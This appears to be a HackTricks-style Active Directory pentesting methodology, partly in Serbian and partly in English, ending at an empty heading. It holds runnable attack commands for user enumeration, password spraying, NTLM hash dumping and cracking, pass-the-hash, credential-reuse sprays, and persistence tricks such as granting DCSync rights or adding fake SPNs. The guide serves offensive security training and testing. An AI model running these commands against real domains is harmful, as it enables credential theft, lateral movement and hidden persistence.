# Active Directory metodologija

{{#include ../../banners/hacktricks-training.md}}

## Osnovni pregled

**Active Directory** predstavlja osnovnu tehnologiju koja omogućava **mrežnim administratorima** efikasno kreiranje i upravljanje **domenima**, **korisnicima** i **objektima** unutar mreže. Dizajniran je za skaliranje, olakšavajući organizovanje velikog broja korisnika u upravljive **grupe** i **podgrupe**, uz kontrolu **pristupnih prava** na različitim nivoima.

Struktura **Active Directory** se sastoji iz tri osnovna sloja: **domeni**, **stabla** i **forest**. **Domen** obuhvata kolekciju objekata, kao što su **korisnici** ili **uređaji**, koji dele zajedničku bazu podataka. **Stabla** su grupe tih domena povezane zajedničkom strukturom, a **forest** predstavlja skup više stabala povezanih kroz **trust relationships**, formirajući najviši nivo organizacione strukture. Specifična **prava pristupa** i **prava komunikacije** mogu se dodeliti na svakom od ovih nivoa.

Ključni pojmovi unutar **Active Directory** uključuju:

1. **Directory** – Sadrži sve informacije vezane za Active Directory objekte.
2. **Object** – Označava entitete unutar direktorijuma, uključujući **korisnike**, **grupe** ili **deljene foldere**.
3. **Domain** – Služi kao kontejner za direktorijumske objekte; više domena može postojati unutar jednog **foresta**, pri čemu svaki održava sopstvenu zbirku objekata.
4. **Tree** – Grupisanje domena koja dele zajednički root domain.
5. **Forest** – Vrhunac organizacione strukture u Active Directory, sastavljen od nekoliko stabala sa **trust relationships** između njih.

**Active Directory Domain Services (AD DS)** obuhvata niz servisa koji su kritični za centralizovano upravljanje i komunikaciju unutar mreže. Ovi servisi uključuju:

1. **Domain Services** – Centralizuje skladištenje podataka i upravlja interakcijama između **korisnika** i **domena**, uključujući **authentication** i **search** funkcionalnosti.
2. **Certificate Services** – Nadgleda kreiranje, distribuciju i upravljanje sigurnim **digital certificates**.
3. **Lightweight Directory Services** – Podržava aplikacije koje koriste direktorijum preko **LDAP protocol**.
4. **Directory Federation Services** – Pruža **single-sign-on** mogućnosti za autentifikaciju korisnika preko više web aplikacija u jednoj sesiji.
5. **Rights Management** – Pomaže u zaštiti autorskog materijala regulisanjem njegove neovlašćene distribucije i upotrebe.
6. **DNS Service** – Ključan za rezoluciju **domain names**.

Za detaljnije objašnjenje pogledajte: [**TechTerms - Active Directory Definition**](https://techterms.com/definition/active_directory)

### **Kerberos Authentication**

Da biste naučili kako da **napadnete AD**, potrebno je vrlo dobro **razumevanje Kerberos authentication procesa**.\
[**Pročitajte ovu stranicu ako još ne znate kako to funkcioniše.**](kerberos-authentication.md)

## Kratka referenca

Možete posetiti [https://wadcoms.github.io/](https://wadcoms.github.io) za brz pregled koje komande možete pokrenuti da enumerišete/iskoristite AD.

> [!WARNING]
> Kerberos komunikacija **zahteva full qualifid name (FQDN)** za izvršavanje akcija. Ako pokušate da pristupite mašini po IP adresi, **biće korišćen NTLM a ne Kerberos**.

## Recon Active Directory (bez kredencijala/sesija)

Ako imate pristup AD okruženju ali nemate nikakve kredencijale/sesije, možete:

- **Pentest the network:**
  - Skenirajte mrežu, pronađite mašine i otvorene portove i pokušajte da **eksploitujete ranjivosti** ili **izvučete kredencijale** iz njih (na primer, [štampači mogu biti veoma interesantne mete](ad-information-in-printers.md)).
  - Enumeracija DNS-a može dati informacije o ključnim serverima u domenu kao što su web, printers, shares, vpn, media, itd.
  - `gobuster dns -d domain.local -t 25 -w /opt/Seclist/Discovery/DNS/subdomain-top2000.txt`
  - Pogledajte Generalnu [**Pentesting Methodology**](../../generic-methodologies-and-resources/pentesting-methodology.md) za više informacija o tome kako ovo raditi.
- **Check for null and Guest access on smb services** (ovo neće raditi na modernim verzijama Windows-a):
  - `enum4linux -a -u "" -p "" <DC IP> && enum4linux -a -u "guest" -p "" <DC IP>`
  - `smbmap -u "" -p "" -P 445 -H <DC IP> && smbmap -u "guest" -p "" -P 445 -H <DC IP>`
  - `smbclient -U '%' -L //<DC IP> && smbclient -U 'guest%' -L //`
  - Detaljniji vodič o tome kako da enumerišete SMB server može se naći ovde:


{{#ref}}
../../network-services-pentesting/pentesting-smb/
{{#endref}}

- **Enumerate Ldap**
  - `nmap -n -sV --script "ldap* and not brute" -p 389 <DC IP>`
  - Detaljniji vodič o tome kako da enumerišete LDAP možete naći ovde (obratite **posebnu pažnju na anonymous access**):


{{#ref}}
../../network-services-pentesting/pentesting-ldap.md
{{#endref}}

- **Poison the network**
  - Pribavite kredencijale [**impersonating services with Responder**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)
  - Pristupite hostu [**abusing the relay attack**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack)
  - Pribavite kredencijale **eksponiranjem** [**fake UPnP services with evil-S**](../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md)[**SDP**](https://medium.com/@nickvangilder/exploiting-multifunction-printers-during-a-penetration-test-engagement-28d3840d8856)
- [**OSINT**](https://book.hacktricks.wiki/en/generic-methodologies-and-resources/external-recon-methodology/index.html):
  - Ekstrahujte korisnička imena/ime iz internih dokumenata, društvenih mreža, servisa (uglavnom web) unutar domen okruženja i takođe iz javno dostupnih izvora.
  - Ako nađete puna imena zaposlenih u kompaniji, možete probati različite AD **username conventions** ([**pročitajte ovo**](https://activedirectorypro.com/active-directory-user-naming-convention/)). Najčešće konvencije su: _NameSurname_, _Name.Surname_, _NamSur_ (3 slova od svakog), _Nam.Sur_, _NSurname_, _N.Surname_, _SurnameName_, _Surname.Name_, _SurnameN_, _Surname.N_, 3 _random letters and 3 random numbers_ (abc123).
  - Alati:
    - [w0Tx/generate-ad-username](https://github.com/w0Tx/generate-ad-username)
    - [urbanadventurer/username-anarchy](https://github.com/urbanadventurer/username-anarchy)

### Enumeracija korisnika

- **Anonymous SMB/LDAP enum:** Pogledajte stranice [**pentesting SMB**](../../network-services-pentesting/pentesting-smb/index.html) i [**pentesting LDAP**](../../network-services-pentesting/pentesting-ldap.md).
- **Kerbrute enum**: Kada se zahteva **nevažeće korisničko ime**, server će odgovoriti koristeći **Kerberos error** kod _KRB5KDC_ERR_C_PRINCIPAL_UNKNOWN_, što nam omogućava da utvrdimo da je korisničko ime nevažeće. **Važeća korisnička imena** će izazvati ili **TGT u AS-REP** odgovoru ili grešku _KRB5KDC_ERR_PREAUTH_REQUIRED_, što ukazuje da se od korisnika zahteva pre-autentikacija.
- **No Authentication against MS-NRPC**: Korišćenje auth-level = 1 (No authentication) protiv MS-NRPC (Netlogon) interfejsa na domain controller-ima. Metoda poziva funkciju `DsrGetDcNameEx2` nakon bindovanja MS-NRPC interfejsa kako bi proverila da li korisnik ili računar postoji bez ikakvih kredencijala. Alat [NauthNRPC](https://github.com/sud0Ru/NauthNRPC) implementira ovu vrstu enumeracije. Istraživanje se može naći [ovde](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/05/22190247/A-journey-into-forgotten-Null-Session-and-MS-RPC-interfaces.pdf)
```bash
./kerbrute_linux_amd64 userenum -d lab.ropnop.com --dc 10.10.10.10 usernames.txt #From https://github.com/ropnop/kerbrute/releases

nmap -p 88 --script=krb5-enum-users --script-args="krb5-enum-users.realm='DOMAIN'" <IP>
Nmap -p 88 --script=krb5-enum-users --script-args krb5-enum-users.realm='<domain>',userdb=/root/Desktop/usernames.txt <IP>

msf> use auxiliary/gather/kerberos_enumusers

crackmapexec smb dominio.es  -u '' -p '' --users | awk '{print $4}' | uniq
python3 nauth.py -t target -u users_file.txt #From https://github.com/sud0Ru/NauthNRPC
```
- **OWA (Outlook Web Access) Server**

Ako na mreži pronađete jedan od ovih servera, takođe možete izvršiti **user enumeration against it**. Na primer, možete koristiti alat [**MailSniper**](https://github.com/dafthack/MailSniper):
```bash
ipmo C:\Tools\MailSniper\MailSniper.ps1
# Get info about the domain
Invoke-DomainHarvestOWA -ExchHostname [ip]
# Enumerate valid users from a list of potential usernames
Invoke-UsernameHarvestOWA -ExchHostname [ip] -Domain [domain] -UserList .\possible-usernames.txt -OutFile valid.txt
# Password spraying
Invoke-PasswordSprayOWA -ExchHostname [ip] -UserList .\valid.txt -Password Summer2021
# Get addresses list from the compromised mail
Get-GlobalAddressList -ExchHostname [ip] -UserName [domain]\[username] -Password Summer2021 -OutFile gal.txt
```
> [!WARNING]
> You can find lists of usernames in [**this github repo**](https://github.com/danielmiessler/SecLists/tree/master/Usernames/Names)  and this one ([**statistically-likely-usernames**](https://github.com/insidetrust/statistically-likely-usernames)).
>
> However, you should have the **name of the people working on the company** from the recon step you should have performed before this. With the name and surname you could used the script [**namemash.py**](https://gist.github.com/superkojiman/11076951) to generate potential valid usernames.

### Knowing one or several usernames

Ok, so you know you have already a valid username but no passwords... Then try:

- [**ASREPRoast**](asreproast.md): If a user **doesn't have** the attribute _DONT_REQ_PREAUTH_ you can **request a AS_REP message** for that user that will contain some data encrypted by a derivation of the password of the user.
- [**Password Spraying**](password-spraying.md): Let's try the most **common passwords** with each of the discovered users, maybe some user is using a bad password (keep in mind the password policy!).
- Note that you can also **spray OWA servers** to try to get access to the users mail servers.


{{#ref}}
password-spraying.md
{{#endref}}

### LLMNR/NBT-NS Poisoning

You might be able to **obtain** some challenge **hashes** to crack **poisoning** some protocols of the **network**:


{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

### NTLM Relay

If you have managed to enumerate the active directory you will have **more emails and a better understanding of the network**. You might be able to to force NTLM [**relay attacks**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack)  to get access to the AD env.

### Steal NTLM Creds

If you can **access other PCs or shares** with the **null or guest user** you could **place files** (like a SCF file) that if somehow accessed will t**rigger an NTLM authentication against you** so you can **steal** the **NTLM challenge** to crack it:


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### Hash Shucking & NT-Candidate Attacks

**Hash shucking** treats every NT hash you already possess as a candidate password for other, slower formats whose key material is derived directly from the NT hash. Instead of brute-forcing long passphrases in Kerberos RC4 tickets, NetNTLM challenges, or cached credentials, you feed the NT hashes into Hashcat’s NT-candidate modes and let it validate password reuse without ever learning the plaintext. This is especially potent after a domain compromise where you can harvest thousands of current and historical NT hashes.

Use shucking when:

- You have an NT corpus from DCSync, SAM/SECURITY dumps, or credential vaults and need to test for reuse in other domains/forests.
- You capture RC4-based Kerberos material (`$krb5tgs$23$`, `$krb5asrep$23$`), NetNTLM responses, or DCC/DCC2 blobs.
- You want to quickly prove reuse for long, uncrackable passphrases and immediately pivot via Pass-the-Hash.

The technique **does not work** against encryption types whose keys are not the NT hash (e.g., Kerberos etype 17/18 AES). If a domain enforces AES-only, you must revert to the regular password modes.

#### Building an NT hash corpus

- **DCSync/NTDS** – Use `secretsdump.py` with history to grab the largest possible set of NT hashes (and their previous values):

```bash
secretsdump.py <domain>/<user>@<dc_ip> -just-dc-ntlm -history -user-status -outputfile smoke_dump
grep -i ':::' smoke_dump.ntds | awk -F: '{print $4}' | sort -u > nt_candidates.txt
```

History entries dramatically widen the candidate pool because Microsoft can store up to 24 previous hashes per account. For more ways to harvest NTDS secrets see:

{{#ref}}
dcsync.md
{{#endref}}

- **Endpoint cache dumps** – `nxc smb <ip> -u <local_admin> -p <password> --local-auth --lsa` (or Mimikatz `lsadump::sam /patch`) extracts local SAM/SECURITY data and cached domain logons (DCC/DCC2). Deduplicate and append those hashes to the same `nt_candidates.txt` list.
- **Track metadata** – Keep the username/domain that produced each hash (even if the wordlist contains only hex). Matching hashes tell you immediately which principal is reusing a password once Hashcat prints the winning candidate.
- Prefer candidates from the same forest or a trusted forest; that maximizes the chance of overlap when shucking.

#### Hashcat NT-candidate modes

| Hash Type                                | Password Mode | NT-Candidate Mode |
| ---------------------------------------- | ------------- | ----------------- |
| Domain Cached Credentials (DCC)          | 1100          | 31500             |
| Domain Cached Credentials 2 (DCC2)       | 2100          | 31600             |
| NetNTLMv1 / NetNTLMv1+ESS                | 5500          | 27000             |
| NetNTLMv2                                | 5600          | 27100             |
| Kerberos 5 etype 23 AS-REQ Pre-Auth      | 7500          | _N/A_             |
| Kerberos 5 etype 23 TGS-REP (Kerberoast) | 13100         | 35300             |
| Kerberos 5 etype 23 AS-REP               | 18200         | 35400             |

Notes:

- NT-candidate inputs **must remain raw 32-hex NT hashes**. Disable rule engines (no `-r`, no hybrid modes) because mangling corrupts the candidate key material.
- These modes are not inherently faster, but the NTLM keyspace (~30,000 MH/s on an M3 Max) is ~100× quicker than Kerberos RC4 (~300 MH/s). Testing a curated NT list is far cheaper than exploring the entire password space in the slow format.
- Always run the **latest Hashcat build** (`git clone https://github.com/hashcat/hashcat && make install`) because modes 31500/31600/35300/35400 shipped recently.
- There is currently no NT mode for AS-REQ Pre-Auth, and AES etypes (19600/19700) require the plaintext password because their keys are derived via PBKDF2 from UTF-16LE passwords, not raw NT hashes.

#### Example – Kerberoast RC4 (mode 35300)

1. Capture an RC4 TGS for a target SPN with a low-privileged user (see the Kerberoast page for details):

{{#ref}}
kerberoast.md
{{#endref}}

```bash
GetUserSPNs.py -dc-ip <dc_ip> -request <domain>/<user> -outputfile roastable_TGS
```

2. Shuck the ticket with your NT list:

```bash
hashcat -m 35300 roastable_TGS nt_candidates.txt
```

Hashcat derives the RC4 key from each NT candidate and validates the `$krb5tgs$23$...` blob. A match confirms that the service account uses one of your existing NT hashes.

3. Immediately pivot via PtH:

```bash
nxc smb <dc_ip> -u roastable -H <matched_nt_hash>
```

You can optionally recover the plaintext later with `hashcat -m 1000 <matched_hash> wordlists/` if needed.

#### Example – Cached credentials (mode 31600)

1. Dump cached logons from a compromised workstation:

```bash
nxc smb <host_ip> -u localadmin -p '<password>' --local-auth --lsa > lsa_dump.txt
```

2. Copy the DCC2 line for the interesting domain user into `dcc2_highpriv.txt` and shuck it:

```bash
hashcat -m 31600 dcc2_highpriv.txt nt_candidates.txt
```

3. A successful match yields the NT hash already known in your list, proving that the cached user is reusing a password. Use it directly for PtH (`nxc smb <dc_ip> -u highpriv -H <hash>`) or brute-force it in fast NTLM mode to recover the string.

The exact same workflow applies to NetNTLM challenge-responses (`-m 27000/27100`) and DCC (`-m 31500`). Once a match is identified you can launch relay, SMB/WMI/WinRM PtH, or re-crack the NT hash with masks/rules offline.



## Enumerating Active Directory WITH credentials/session

For this phase you need to have **compromised the credentials or a session of a valid domain account.** If you have some valid credentials or a shell as a domain user, **you should remember that the options given before are still options to compromise other users**.

Before start the authenticated enumeration you should know what is the **Kerberos double hop problem.**


{{#ref}}
kerberos-double-hop-problem.md
{{#endref}}

### Enumeration

Having compromised an account is a **big step to start compromising the whole domain**, because you are going to be able to start the **Active Directory Enumeration:**

Regarding [**ASREPRoast**](asreproast.md) you can now find every possible vulnerable user, and regarding [**Password Spraying**](password-spraying.md) you can get a **list of all the usernames** and try the password of the compromised account, empty passwords and new promising passwords.

- You could use the [**CMD to perform a basic recon**](../basic-cmd-for-pentesters.md#domain-info)
- You can also use [**powershell for recon**](../basic-powershell-for-pentesters/index.html) which will be stealthier
- You can also [**use powerview**](../basic-powershell-for-pentesters/powerview.md) to extract more detailed information
- Another amazing tool for recon in an active directory is [**BloodHound**](bloodhound.md). It is **not very stealthy** (depending on the collection methods you use), but **if you don't care** about that, you should totally give it a try. Find where users can RDP, find path to other groups, etc.
- **Other automated AD enumeration tools are:** [**AD Explorer**](bloodhound.md#ad-explorer)**,** [**ADRecon**](bloodhound.md#adrecon)**,** [**Group3r**](bloodhound.md#group3r)**,** [**PingCastle**](bloodhound.md#pingcastle)**.**
- [**DNS records of the AD**](ad-dns-records.md) as they might contain interesting information.
- A **tool with GUI** that you can use to enumerate the directory is **AdExplorer.exe** from **SysInternal** Suite.
- You can also search in the LDAP database with **ldapsearch** to look for credentials in fields _userPassword_ & _unixUserPassword_, or even for _Description_. cf. [Password in AD User comment on PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#password-in-ad-user-comment) for other methods.
- If you are using **Linux**, you could also enumerate the domain using [**pywerview**](https://github.com/the-useless-one/pywerview).
- You could also try automated tools as:
- [**tomcarver16/ADSearch**](https://github.com/tomcarver16/ADSearch)
- [**61106960/adPEAS**](https://github.com/61106960/adPEAS)
- **Extracting all domain users**

It's very easy to obtain all the domain usernames from Windows (`net user /domain` ,`Get-DomainUser` or `wmic useraccount get name,sid`). In Linux, you can use: `GetADUsers.py -all -dc-ip 10.10.10.110 domain.com/username` or `enum4linux -a -u "user" -p "password" <DC IP>`

> Even if this Enumeration section looks small this is the most important part of all. Access the links (mainly the one of cmd, powershell, powerview and BloodHound), learn how to enumerate a domain and practice until you feel comfortable. During an assessment, this will be the key moment to find your way to DA or to decide that nothing can be done.

### Kerberoast

Kerberoasting involves obtaining **TGS tickets** used by services tied to user accounts and cracking their encryption—which is based on user passwords—**offline**.

More about this in:


{{#ref}}
kerberoast.md
{{#endref}}

### Remote connexion (RDP, SSH, FTP, Win-RM, etc)

Once you have obtained some credentials you could check if you have access to any **machine**. For that matter, you could use **CrackMapExec** to attempt connecting on several servers with different protocols, accordingly to your ports scans.

### Local Privilege Escalation

If you have compromised credentials or a session as a regular domain user and you have **access** with this user to **any machine in the domain** you should try to find your way to **escalate privileges locally and looting for credentials**. This is because only with local administrator privileges you will be able to **dump hashes of other users** in memory (LSASS) and locally (SAM).

There is a complete page in this book about [**local privilege escalation in Windows**](../windows-local-privilege-escalation/index.html) and a [**checklist**](../checklist-windows-privilege-escalation.md). Also, don't forget to use [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite).

### Current Session Tickets

It's very **unlikely** that you will find **tickets** in the current user **giving you permission to access** unexpected resources, but you could check:
```bash
## List all tickets (if not admin, only current user tickets)
.\Rubeus.exe triage
## Dump the interesting one by luid
.\Rubeus.exe dump /service:krbtgt /luid:<luid> /nowrap
[IO.File]::WriteAllBytes("ticket.kirbi", [Convert]::FromBase64String("<BASE64_TICKET>"))
```
### NTLM Relay

If you have managed to enumerate the active directory you will have **više email-ova i bolje razumevanje mreže**. You might be able to to force NTLM [**relay attacks**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack)**.**

### Looks for Creds in Computer Shares | SMB Shares

Now that you have some basic credentials you should check if you can **pronaći** bilo koje **zanimljive fajlove koji se dele unutar AD**. You could do that manually but it's a very boring repetitive task (and more if you find hundreds of docs you need to check).

[**Pratite ovaj link da saznate o alatima koje možete koristiti.**](../../network-services-pentesting/pentesting-smb/index.html#domain-shared-folders-search)

### Steal NTLM Creds

If you can **access other PCs or shares** you could **place files** (like a SCF file) that if somehow accessed will t**okida NTLM autentifikaciju protiv vas** so you can **steal** the **NTLM challenge** to crack it:


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### CVE-2021-1675/CVE-2021-34527 PrintNightmare

This vulnerability allowed any authenticated user to **compromise the domain controller**.


{{#ref}}
printnightmare.md
{{#endref}}

## Privilege escalation on Active Directory WITH privileged credentials/session

**For the following techniques a regular domain user is not enough, you need some special privileges/credentials to perform these attacks.**

### Hash extraction

Hopefully you have managed to **kompromitovati neki lokalni admin** account using [AsRepRoast](asreproast.md), [Password Spraying](password-spraying.md), [Kerberoast](kerberoast.md), [Responder](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md) including relaying, [EvilSSDP](../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md), [escalating privileges locally](../windows-local-privilege-escalation/index.html).\
Then, its time to dump all the hashes in memory and locally.\
[**Pročitajte ovu stranicu o različitim načinima dobijanja hash-eva.**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

### Pass the Hash

**Once you have the hash of a user**, you can use it to **impersonate** it.\
You need to use some **tool** that will **perform** the **NTLM authentication using** that **hash**, **or** you could create a new **sessionlogon** and **inject** that **hash** inside the **LSASS**, so when any **NTLM authentication is performed**, that **hash will be used.** The last option is what mimikatz does.\
[**Pročitajte ovu stranicu za više informacija.**](../ntlm/index.html#pass-the-hash)

### Over Pass the Hash/Pass the Key

This attack aims to **use the user NTLM hash to request Kerberos tickets**, as an alternative to the common Pass The Hash over NTLM protocol. Therefore, this could be especially **useful in networks where NTLM protocol is disabled** and only **Kerberos is allowed** as authentication protocol.


{{#ref}}
over-pass-the-hash-pass-the-key.md
{{#endref}}

### Pass the Ticket

In the **Pass The Ticket (PTT)** attack method, attackers **steal a user's authentication ticket** instead of their password or hash values. This stolen ticket is then used to **impersonate the user**, gaining unauthorized access to resources and services within a network.


{{#ref}}
pass-the-ticket.md
{{#endref}}

### Credentials Reuse

If you have the **hash** or **password** of a **local administrato**r you should try to **login locally** to other **PCs** with it.
```bash
# Local Auth Spray (once you found some local admin pass or hash)
## --local-auth flag indicate to only try 1 time per machine
crackmapexec smb --local-auth 10.10.10.10/23 -u administrator -H 10298e182387f9cab376ecd08491764a0 | grep +
```
> [!WARNING]
> Imajte na umu da je ovo prilično **bučno** i da bi **LAPS** to **ublažio**.

### MSSQL Abuse & Trusted Links

Ako korisnik ima privilegije da **pristupi MSSQL instancama**, mogao bi da ih iskoristi za **izvršavanje komandi** na MSSQL hostu (ako se vrti kao SA), **ukrade** NetNTLM **hash** ili čak izvede **relay** **attack**.\
Takođe, ako je MSSQL instanca poverljiva (database link) za drugu MSSQL instancu. Ako korisnik ima privilegije nad poverenom bazom podataka, moći će da **iskoristi odnos poverenja da izvršava upite i na drugoj instanci**. Ti trust-ovi se mogu lančati i u nekom trenutku korisnik može naći pogrešno konfigurisanu bazu gde može da izvršava komande.\
**Linkovi između baza rade čak i preko forest trust-ova.**


{{#ref}}
abusing-ad-mssql.md
{{#endref}}

### IT asset/deployment platforms abuse

Sistemi trećih strana za inventar i deployment često otvaraju moćne puteve do kredencijala i izvršenja koda. Vidi:

{{#ref}}
sccm-management-point-relay-sql-policy-secrets.md
{{#endref}}

{{#ref}}
lansweeper-security.md
{{#endref}}

### Unconstrained Delegation

Ako nađete bilo koji Computer objekat sa atributom [ADS_UF_TRUSTED_FOR_DELEGATION](<https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx>) i imate domenske privilegije na tom računaru, moći ćete da dump-ujete TGT-ove iz memorije svih korisnika koji se prijave na računar.\
Dakle, ako se **Domain Admin prijavi na računar**, moći ćete da dump-ujete njegov TGT i impersonirate ga koristeći [Pass the Ticket](pass-the-ticket.md).\
Zahvaljujući constrained delegation možete čak **automatski kompromitovati Print Server** (nadamo se da će to biti DC).


{{#ref}}
unconstrained-delegation.md
{{#endref}}

### Constrained Delegation

Ako je korisniku ili računaru dozvoljena "Constrained Delegation", moći će da **impersonira bilo kog korisnika da pristupi nekim servisima na računaru**.\
Zatim, ako **kompromitujete hash** tog korisnika/računara moći ćete da **impersonirate bilo kog korisnika** (čak i domain admine) da pristupite nekim servisima.


{{#ref}}
constrained-delegation.md
{{#endref}}

### Resourced-based Constrain Delegation

Imati **WRITE** privilegiju na Active Directory objektu udaljenog računara omogućava postizanje izvršenja koda sa **povišenim privilegijama**:


{{#ref}}
resource-based-constrained-delegation.md
{{#endref}}

### Permissions/ACLs Abuse

Kompromitovani korisnik može imati neke **zanimljive privilegije nad nekim domenskim objektima** koje bi vam omogućile da **migrate** lateralno/**eskalirate** privilegije kasnije.


{{#ref}}
acl-persistence-abuse/
{{#endref}}

### Printer Spooler service abuse

Pronalazak **Spool servisa koji sluša** unutar domena može se **iskoristiti** za **dobijanje novih kredencijala** i **eskalaciju privilegija**.


{{#ref}}
printers-spooler-service-abuse.md
{{#endref}}

### Third party sessions abuse

Ako **drugi korisnici** **pristupaju** **kompromitovanom** računaru, moguće je **skupljati kredencijale iz memorije** pa čak i **inject-ovati beacone u njihove procese** da ih impersonirate.\
Obično korisnici pristupaju sistemu preko RDP-a, pa ovde imate kako da izvedete par napada nad trećim RDP sesijama:


{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### LAPS

**LAPS** pruža sistem za upravljanje **lokalnim Administrator password-om** na domain-joined računarima, osiguravajući da je **randomizovan**, jedinstven i često **menjan**. Ti password-i su čuvani u Active Directory i pristup je kontrolisan putem ACL-a samo za autorizovane korisnike. Sa dovoljnim permisijama za pristup ovim password-ima, pivotovanje na druge računare postaje moguće.


{{#ref}}
laps.md
{{#endref}}

### Certificate Theft

**Sakupljanje sertifikata** sa kompromitovanog računara može biti način za eskalaciju privilegija unutar okruženja:


{{#ref}}
ad-certificates/certificate-theft.md
{{#endref}}

### Certificate Templates Abuse

Ako su konfigurirani **ranjivi templates**, moguće ih je zloupotrebiti za eskalaciju privilegija:


{{#ref}}
ad-certificates/domain-escalation.md
{{#endref}}

## Post-exploitation with high privilege account

### Dumping Domain Credentials

Kada dobijete **Domain Admin** ili još bolje **Enterprise Admin** privilegije, možete **dump-ovati** **domen bazu podataka**: _ntds.dit_.

[**Više informacija o DCSync attack nalazi se ovde**](dcsync.md).

[**Više informacija o tome kako ukrasti NTDS.dit nalazi se ovde**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

### Privesc as Persistence

Neke od tehnika pomenutih ranije mogu se iskoristiti za persistence.\
Na primer, možete:

- Učiniti korisnike ranjivim na [**Kerberoast**](kerberoast.md)

```bash
Set-DomainObject -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}r
```

- Učiniti korisnike ranjivim na [**ASREPRoast**](asreproast.md)

```bash
Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
```

- Dodeliti [**DCSync**](#dcsync) privilegije korisniku

```bash
Add-DomainObjectAcl -TargetIdentity "DC=SUB,DC=DOMAIN,DC=LOCAL" -PrincipalIdentity bfarmer -Rights DCSync
```

### Silver Ticket

Silver Ticket attack kreira **legitiman Ticket Granting Service (TGS) ticket** za određeni servis koristeći **NTLM hash** (na primer, **hash PC account-a**). Ova metoda se koristi za **pristup privilegijama servisa**.


{{#ref}}
silver-ticket.md
{{#endref}}

### Golden Ticket

Golden Ticket attack podrazumeva da napadač dobije pristup **NTLM hash-u krbtgt account-a** u Active Directory okruženju. Taj nalog je poseban zato što se koristi za potpisivanje svih **Ticket Granting Tickets (TGTs)**, koji su bitni za autentikaciju unutar AD mreže.

Kada napadač dobije ovaj hash, može kreirati **TGT-ove** za bilo koji nalog po svom izboru (Silver ticket attack).


{{#ref}}
golden-ticket.md
{{#endref}}

### Diamond Ticket

Ovo su kao golden ticket-ovi kovani na način koji **zaobilazi uobičajene mehanizme za detekciju golden tickets.**


{{#ref}}
diamond-ticket.md
{{#endref}}

### **Certificates Account Persistence**

**Imati sertifikate naloga ili biti u stanju da ih zatražite** je veoma dobar način da ostanete persistentni u korisničkom nalogu (čak i ako korisnik promeni lozinku):


{{#ref}}
ad-certificates/account-persistence.md
{{#endref}}

### **Certificates Domain Persistence**

**Korišćenjem sertifikata takođe je moguće održavati persistence sa visokim privilegijama unutar domena:**


{{#ref}}
ad-certificates/domain-persistence.md
{{#endref}}

### AdminSDHolder Group

Objekat **AdminSDHolder** u Active Directory obezbeđuje sigurnost **privilegovanih grupa** (kao što su Domain Admins i Enterprise Admins) primenom standardnog **Access Control List (ACL)** preko tih grupa kako bi sprečio neautorizovane izmene. Međutim, ova funkcija se može zloupotrebiti; ako napadač izmeni AdminSDHolder-ov ACL da da puna pristup običnom korisniku, taj korisnik dobija široku kontrolu nad svim privilegovanim grupama. Ova sigurnosna mera, koja je namenjena zaštiti, može takođe dovesti do kontraefekta, omogućavajući neovlašćen pristup ukoliko se ne prati pažljivo.

[**Više informacija o AdminDSHolder Group ovde.**](privileged-groups-and-token-privileges.md#adminsdholder-group)

### DSRM Credentials

Unutar svakog **Domain Controller (DC)** postoji **local administrator** nalog. Dobijanjem admin prava na takvom računaru, lokalni Administrator hash može biti ekstrahovan koristeći **mimikatz**. Nakon toga je neophodna izmena registra da se **omogući korišćenje ove lozinke**, što dozvoljava udaljeni pristup lokalnom Administrator nalogu.


{{#ref}}
dsrm-credentials.md
{{#endref}}

### ACL Persistence

Možete **dati** neke **specijalne permisije** korisniku nad određenim domenskim objektima koje će omogućiti tom korisniku da **eskalira privilegije u budućnosti**.


{{#ref}}
acl-persistence-abuse/
{{#endref}}

### Security Descriptors

**Security descriptors** se koriste za **čuvanje** **permisija** koje **objekat** ima **nad** nekim **objektom**. Ako možete da napravite i **mali izmen** u **security descriptor-u** objekta, možete dobiti vrlo zanimljive privilegije nad tim objektom bez potrebe da budete član privilegovane grupe.


{{#ref}}
security-descriptors.md
{{#endref}}

### Skeleton Key

Izmenite **LSASS** u memoriji da uspostavite **univerzalnu lozinku**, što daje pristup svim domen nalozima.


{{#ref}}
skeleton-key.md
{{#endref}}

### Custom SSP

[Learn what is a SSP (Security Support Provider) here.](../authentication-credentials-uac-and-efs/index.html#security-support-provider-interface-sspi)\
Možete kreirati svoj **SSP** da **uhvatite** u **clear text** **kredencijale** korišćene za pristup mašini.


{{#ref}}
custom-ssp.md
{{#endref}}

### DCShadow

Registruje **novi Domain Controller** u AD i koristi ga da **gurne atribute** (SIDHistory, SPNs...) na specificiranim objektima **bez** ostavljanja bilo kakvih **logova** vezanih za **izmene**. Potrebne su DA privilegije i biti unutar **root domain-a**.\
Napomena: ako koristite pogrešne podatke, pojaviće se prilično ružni logovi.


{{#ref}}
dcshadow.md
{{#endref}}

### LAPS Persistence

